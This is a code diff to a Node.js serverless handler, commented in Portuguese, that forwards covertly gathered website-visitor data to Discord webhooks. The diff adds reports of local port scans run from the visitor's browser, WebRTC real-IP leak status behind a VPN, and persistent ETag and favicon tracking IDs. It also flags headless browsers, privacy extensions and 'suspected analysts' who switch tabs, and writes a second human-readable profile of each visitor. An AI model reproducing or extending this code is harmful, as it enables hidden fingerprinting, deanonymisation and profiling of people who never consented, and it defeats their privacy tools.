@@ -3,7 +3,8 @@
 module.exports = async function(req, res) {
     if(req.method !== 'POST') return res.status(405).send('Method Not Allowed');
 
-    const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
+    const DISCORD_WEBHOOK_URL  = process.env.DISCORD_WEBHOOK_URL;
+    const DISCORD_GUIDE_WEBHOOK = process.env.DISCORD_GUIDE_WEBHOOK_URL; // segundo webhook — tabela de interpretação
     if(!DISCORD_WEBHOOK_URL) return res.status(500).send('Webhook URL não configurada.');
 
     try{
@@ -11,6 +12,26 @@ module.exports = async function(req, res) {
         const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
                 || req.headers['client-ip']
                 || d.ip || 'N/A';
+
+        if(d._update === 'portscan'){
+            const embed = {
+                title: '🔍 Port Scan Local',
+                color: 0xe74c3c,
+                fields: [
+                    {name:'🚪 Portas abertas',   value: d.openPorts||'none detected',  inline:false},
+                    {name:'🔢 Quantidade',        value: String(d.openCount||0),         inline:true},
+                    {name:'👤 Perfil do usuário', value: d.profile||'standard user',     inline:true},
+                ],
+                footer: {text: 'WebSocket probe — portas locais (127.0.0.1)'},
+                timestamp: new Date().toISOString(),
+            };
+            await fetch(DISCORD_WEBHOOK_URL,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({embeds:[embed]}),
+            });
+            return res.status(200).send('ok');
+        }
 
         if(d._update === 'behavior'){
             const embed = {
@@ -26,6 +47,10 @@ module.exports = async function(req, res) {
                     {name:'📏 Velocidade scroll',   value:d.scrollSpeed||'N/A',             inline:true},
                     {name:'⌨️ Teclas pressionadas', value:String(d.keystrokes||'0'),        inline:true},
                     {name:'🖱 Cliques',             value:String(d.clicks||'0'),            inline:true},
+                    {name:'👁 Trocas de aba',       value:String(d.tabSwitches||'0'),        inline:true},
+                    {name:'⏱ Tempo fora (total)',   value:d.totalHiddenMs||'N/A',            inline:true},
+                    {name:'⚡ Tempo médio retorno',  value:d.avgReactMs||'N/A',               inline:true},
+                    {name:'🕵️ Analista suspeito',   value:d.analystSuspect||'no',            inline:true},
                 ],
                 footer:{text:'Biometria passiva (4s de observação) + Shannon entropy'},
                 timestamp: new Date().toISOString(),
@@ -107,8 +132,14 @@ module.exports = async function(req, res) {
                 {name:'📷 Mídia (Cam/Mic/Spk)',value: `${d.cameras||'0'}/${d.mics||'0'}/${d.speakers||'0'}`, inline:true},
                 {name:'🌀 Sensores (Acel/Giro/Ori)', value: `${d.hasAccelerometer||'no'}/${d.hasGyroscope||'no'}/${d.hasOrientation||'no'}`, inline:true},
                 {name:'📶 Conexão / RTT',      value: `${d.connection||'N/A'} / ${d.rtt||'N/A'}`, inline:true},
+                {name:'🔊 Audio output latency', value: d.audioOutputLatency||'N/A',             inline:true},
+                {name:'🖥 Audio env',           value: d.audioEnv||'N/A',                        inline:true},
+                {name:'🔒 Permissions',         value: (d.permsRaw||'N/A').slice(0,200),          inline:false},
+                {name:'🤖 Headless suspected',  value: d.permsHeadless||'N/A',                   inline:true},
+                {name:'📋 Perms detail',        value: (d.permsDetail||'N/A').slice(0,200),       inline:false},
                 {name:'⏱ Load time',          value: d.loadTime||'N/A',                   inline:true},
                 {name:'🔗 Referrer',           value: (d.referrer||'(direct)').slice(0,200), inline:false},
+                {name:'🔬 BBox sample',        value: (d.fontBBoxSample||'N/A').slice(0,200), inline:false},
             ]
         };
 
@@ -134,6 +165,13 @@ module.exports = async function(req, res) {
                 {name:'🚨 Core spoof suspect', value: d.coreSpoofSuspect||'N/A',           inline:true},
                 {name:'🎨 Color scheme',       value: d.mqColorScheme||'N/A',              inline:true},
                 {name:`🔤 Fontes (${d.fontCount||0})`, value:(d.fonts||'none').slice(0,200), inline:false},
+                {name:'📐 Font BBox hash',     value: `\`${d.fontBBoxHash||'N/A'}\``,       inline:true},
+                {name:'🔢 BBox fonts count',   value: d.fontBBoxCount||'N/A',               inline:true},
+                {name:'🖼 Canvas noisy',       value: d.canvasNoisy||'N/A',                 inline:true},
+                {name:'🛡 Canvas verdict',     value: d.canvasVerdict||'N/A',               inline:true},
+                {name:'🔌 Privacy extension',  value: d.canvasExtension||'N/A',             inline:true},
+                {name:'🤥 Lies detected',      value: (d.liesDetected||'none').slice(0,200), inline:false},
+                {name:'🚨 Suspected faker',    value: d.liesSuspected||'N/A',               inline:true},
             ],
             footer: { text: `UA: ${(d.userAgent||'').slice(0,120)}` },
             timestamp: new Date().toISOString(),
@@ -144,6 +182,66 @@ module.exports = async function(req, res) {
             headers:{'Content-Type':'application/json'},
             body: JSON.stringify({embeds:[embed1, embed2, embed3]}),
         });
+
+        // ── Segundo webhook: resumo em linguagem humana ──
+        if (DISCORD_GUIDE_WEBHOOK) {
+            // Determina perfil do visitante
+            const isHeadless   = d.permsHeadless === 'YES' || d.liesSuspected === 'YES';
+            const isVM         = (d.audioEnv||'').includes('VM') || (d.audioEnv||'').includes('virtual');
+            const hasVPN       = d.vpnLikely === 'YES' || d.tzDivergence === 'YES';
+            const rtcLeaked    = d.rtcLeak === 'YES';
+            const privExtension= d.canvasExtension === 'YES';
+            const isAnalyst    = d.analystSuspect && d.analystSuspect.startsWith('YES');
+            const isDev        = (d.profile||'').includes('developer');
+            const openPorts    = d.openPorts && d.openPorts !== 'none detected' && d.openPorts !== 'N/A';
+
+            let perfil = '🟢 Visitante comum';
+            let perfilDesc = 'Sem sinais de proteção ou automação. Dados são confiáveis.';
+            if (isHeadless)        { perfil = '🤖 Bot / Automação';   perfilDesc = 'Navegador automatizado detectado (Puppeteer/Selenium ou similar). Provavelmente análise do site.'; }
+            else if (isAnalyst)    { perfil = '🔍 Analista suspeito'; perfilDesc = 'Humano real, mas trocou de aba várias vezes rapidamente. Pode estar analisando o código.'; }
+            else if (isDev)        { perfil = '👨‍💻 Desenvolvedor';      perfilDesc = 'Portas de desenvolvimento abertas no computador (Node, Python, etc).'; }
+            else if (privExtension){ perfil = '👻 Privacidade ativa'; perfilDesc = 'Usa extensão de privacidade (Brave Shields / CanvasBlocker). Fingerprints podem estar falsificados.'; }
+
+            // VPN status
+            let vpnStatus = '✅ Sem VPN detectada';
+            if (hasVPN && !rtcLeaked)  vpnStatus = '🔒 VPN ativa e protegendo IP';
+            if (hasVPN && rtcLeaked)   vpnStatus = '⚠️ VPN ativa mas IP real vazou via WebRTC';
+            if (!hasVPN && rtcLeaked)  vpnStatus = '🔓 Sem VPN — IP real exposto';
+
+            // Confiabilidade dos dados
+            const reliable = !privExtension && !isHeadless && !isVM;
+            const confianca = reliable ? '🟢 Alta — dados confiáveis' : '🟡 Média — alguns dados podem estar adulterados';
+
+            const guideEmbed = {
+                title: `📋 Resumo do Visitante — ${new Date().toLocaleString('pt-BR', {timeZone:'America/Sao_Paulo'})}`,
+                color: isHeadless ? 0xe74c3c : isDev||isAnalyst ? 0xf39c12 : privExtension ? 0x9b59b6 : 0x2ecc71,
+                fields: [
+                    { name: '👤 Perfil identificado',    value: `**${perfil}**\n${perfilDesc}`, inline: false },
+                    { name: '🌍 Localização estimada',   value: `${d.geoCity||d.city||'?'}, ${d.geoRegion||d.region||'?'}, ${d.geoCountry||d.country||'?'}`, inline: true },
+                    { name: '🏢 Provedor de internet',   value: d.org||'N/A', inline: true },
+                    { name: '🔒 Status de VPN',          value: vpnStatus, inline: false },
+                    { name: '🖥 Sistema operacional',    value: d.platform||'N/A', inline: true },
+                    { name: '🌐 Navegador',              value: d.browser||'N/A', inline: true },
+                    { name: '🎮 Placa de vídeo',         value: (d.webglRenderer||'N/A').slice(0,80), inline: false },
+                    { name: '🖥 Ambiente de execução',   value: isVM ? `⚠️ ${d.audioEnv}` : '✅ Máquina física', inline: true },
+                    { name: '🔌 Extensão de privacidade',value: privExtension ? '⚠️ Detectada' : '✅ Não detectada', inline: true },
+                    { name: '🤥 UA falsificado',         value: d.liesSuspected === 'YES' ? `⚠️ Sim — ${(d.liesDetected||'').slice(0,100)}` : '✅ Não', inline: false },
+                    { name: '🚪 Portas abertas',         value: openPorts ? `⚠️ ${d.openPorts} → perfil: **${d.profile}**` : '✅ Nenhuma relevante', inline: false },
+                    { name: '📊 Confiabilidade dos dados', value: confianca, inline: false },
+                    { name: '🔑 ID permanente (ETag)',   value: `\`${d.etagId||'N/A'}\` — ${d.etagReturning||'N/A'}`, inline: true },
+                    { name: '🔑 ID permanente (Favicon)',value: `\`${d.faviconId||'N/A'}\` — ${d.faviconReturning||'N/A'}`, inline: true },
+                    { name: '📅 Histórico',              value: `Visita #${d.visitCount||'?'} • Primeiro acesso: ${d.firstSeen||'?'}`, inline: false },
+                ],
+                footer: { text: `IP: ${d.edgeIP||'N/A'} • JA4: ${(d.ja4||'N/A').slice(0,40)} • UA: ${(d.userAgent||'').slice(0,80)}` },
+                timestamp: new Date().toISOString(),
+            };
+
+            fetch(DISCORD_GUIDE_WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({embeds:[guideEmbed]}),
+            }).catch(_=>{}); // non-blocking, não bloqueia resposta ao cliente
+        }
 
         return res.status(200).send('ok');
     }catch(e){
